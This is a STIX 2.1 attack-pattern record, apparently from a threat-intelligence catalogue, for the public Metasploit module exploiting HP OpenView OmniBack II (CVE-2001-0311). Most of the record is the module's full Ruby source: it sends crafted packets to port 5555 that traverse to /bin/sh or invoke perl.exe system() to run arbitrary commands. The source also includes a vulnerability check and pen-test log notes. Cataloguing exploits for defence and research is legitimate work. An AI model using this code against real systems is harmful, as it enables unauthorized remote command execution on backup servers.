{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--158f6c9f-34c7-4fd9-bc41-40c2bc23c852",
    "created": "2024-08-14T17:06:57.162247Z",
    "modified": "2024-08-14T17:06:57.162251Z",
    "name": "HP OpenView OmniBack II Command Execution",
    "description": " This module uses a vulnerability in the OpenView Omniback II service to execute arbitrary commands. This vulnerability was discovered by DiGiT and his code was used as the basis for this module.  For Microsoft Windows targets, due to module limitations, use the \"unix/cmd/generic\" payload and set CMD to your command. You can only pass a small amount of characters (4) to the command line on Windows. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/openview_omniback_exec.rb",
            "external_id": "openview_omniback_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0311"
        },
        {
            "source_name": "reference",
            "url": "http://www.securiteam.com/exploits/6M00O150KG.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView OmniBack II Command Execution',\n      'Description'    => %q{\n          This module uses a vulnerability in the OpenView Omniback II\n        service to execute arbitrary commands. This vulnerability was\n        discovered by DiGiT and his code was used as the basis for this\n        module.\n\n        For Microsoft Windows targets, due to module limitations, use the\n        \"unix/cmd/generic\" payload and set CMD to your command. You can only\n        pass a small amount of characters (4) to the command line on Windows.\n      },\n      'Author'         => [ 'hdm', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2001-0311'],\n          ['OSVDB', '6018'],\n          ['BID', '11032'],\n          ['URL', 'http://www.securiteam.com/exploits/6M00O150KG.html'],\n        ],\n      'Platform'       => ['unix'], # win\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Unix', { }],\n          [ 'Windows', { }],\n        ],\n      'DisclosureDate' => '2001-02-28',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(5555)\n      ])\n  end\n\n  def check\n\n    if (target.name =~ /Unix/)\n      connect\n\n      poof =\n        \"\\x00\\x00\\x00.2\"+\n        \"\\x00 a\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 A\"+\n        \"\\x00 28\"+\n        \"\\x00/../../../bin/sh\"+\n        \"\\x00\\x00\"+\n        \"digit \"+\n        \"AAAA\\n\\x00\"\n\n      sock.put(poof)\n      sock.put(\"echo /etc/*;\\n\")\n      res = sock.get_once(-1, 5)\n      disconnect\n\n      if !(res and res.length > 0)\n        vprint_status(\"The remote service did not reply to our request\")\n        return Exploit::CheckCode::Safe\n      end\n\n      if (res =~ /passwd|group|resolv/)\n        vprint_status(\"The remote service is exploitable\")\n        return Exploit::CheckCode::Vulnerable\n      end\n\n      return Exploit::CheckCode::Safe\n    end\n\n    if (target.name =~ /Windows/)\n      connect\n\n      poof =\n        \"\\x00\\x00\\x00.2\"+\n        \"\\x00 a\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 A\"+\n        \"\\x00 28\"+\n        \"\\x00\\\\perl.exe\"+\n        \"\\x00\\x20-e\\x20system(dir)\\x00\\x00\"+\n        \"digit \"+\n        \"AAAA\\n\\x00\"\n\n      sock.put(poof)\n      res = sock.get_once(-1, 5)\n      disconnect\n\n      print_status(res.to_s)\n\n      if !(res and res.length > 0)\n        print_status(\"The remote service did not reply to our request\")\n        return Exploit::CheckCode::Safe\n      end\n\n      if (res =~ /V.o.l.u.m.e/) #Unicode\n        print_status(\"The remote service is exploitable\")\n        return Exploit::CheckCode::Vulnerable\n      end\n\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if (target.name =~ /Unix/)\n      connect\n\n      poof =\n        \"\\x00\\x00\\x00.2\"+\n        \"\\x00 a\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 A\"+\n        \"\\x00 28\"+\n        \"\\x00/../../../bin/sh\"+\n        \"\\x00\\x00\"+\n        \"digit \"+\n        \"AAAA\\n\\x00\"\n\n      sock.put(poof)\n      sock.put(payload.encoded + \";\\n\")\n      res = sock.get_once(-1, 5)\n\n      if !(res and res.length > 0)\n        print_status(\"The remote service did not reply to our request\")\n        disconnect\n        return\n      end\n\n      print(res)\n\n      handler\n      disconnect\n    end\n\n    if (target.name =~ /Windows/)\n\n      # aushack\n      #\n      # Tested during pen test against Windows 2003 server.\n      # Windows Service details:\n      # - Data Protector Inet\n      # -> [HP OpenView Storage Data Protector] - Backup client service\n      # -> \"C:\\Program Files\\OmniBack\\bin\\omniinet.exe\"\n      # -> OmniInet service for Windows NT\n      # -> File version: 6.0.0.0\n      #\n      # This needs to be cleaned up later. Preferably using the Windows/cmd/perl payloads.\n      #\n      # Notes:\n      # I was unable to use directory traversal, OR (||) or AND (&&) techniques to directly run cmd.exe\n      # Perhaps a difference in Windows/Unix code? Logs:\n      #\n      #11/11/2008 12:18:37 PM  INET.5112.1884 [\"inetnt/allow_deny.c /main/dp56/dp60_fix/2\":496] A.06.00 bDPWIN_00384\n      #A request 28 (..\\foo.exe) came from host [attacker] which is not a cell manager of this client\n      #\n      #11/11/2008 12:18:37 PM  INET.5112.1884 [\"inetnt/ntinet.c /main/dp56/dp60_fix/2\":5170] A.06.00 bDPWIN_00384\n      #[RxNtIntegUtil] parameter refused: ..\\foo.exe\n      #\n      #11/11/2008 12:21:59 PM  INET.5112.1884 [\"inetnt/allow_deny.c /main/dp56/dp60_fix/2\":496] A.06.00 bDPWIN_00384\n      #A request 28 (x.exe || cmd /c dir > c:) came from host [attacker] which is not a cell manager of this client\n      #\n      #11/11/2008 12:21:59 PM  INET.5112.1884 [\"inetnt/ntinet.c /main/dp56/dp60_fix/2\":5170] A.06.00 bDPWIN_00384\n      #[RxNtIntegUtil] parameter refused: x.exe || cmd /c dir > c:\n      #\n      #11/11/2008 12:22:40 PM  INET.5112.1884 [\"inetnt/allow_deny.c /main/dp56/dp60_fix/2\":496] A.06.00 bDPWIN_00384\n      #A request 28 (perl.exe && cmd /c dir >) came from [attacker] which is not a cell manager of this client\n      #\n      #11/11/2008 12:22:40 PM  INET.5112.1884 [\"inetnt/ntinet.c /main/dp56/dp60_fix/2\":5170] A.06.00 bDPWIN_00384\n      #[RxNtIntegUtil] parameter refused: perl.exe && cmd /c dir >\n\n      connect\n\n      poof =\n        \"\\x00\\x00\\x00.2\"+\n        \"\\x00 a\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 0\"+\n        \"\\x00 A\"+\n        \"\\x00 28\"+\n        \"\\x00\\\\perl.exe\"+\n        \"\\x00\\x20-esystem(#{payload.encoded})\\x00\\x00\"+\n        \"digit \"+\n        \"AAAA\\n\\x00\"\n\n      sock.put(poof)\n      #sock.put(payload.encoded + \"\\n\")\n      res = sock.get_once(-1, 5)\n\n      if !(res and res.length > 0)\n        print_status(\"The remote service did not reply to our request\")\n        disconnect\n        return\n      end\n\n      print(res)\n\n      handler\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-02-28",
    "x_mitre_platforms": [
        "['unix'], # win"
    ]
}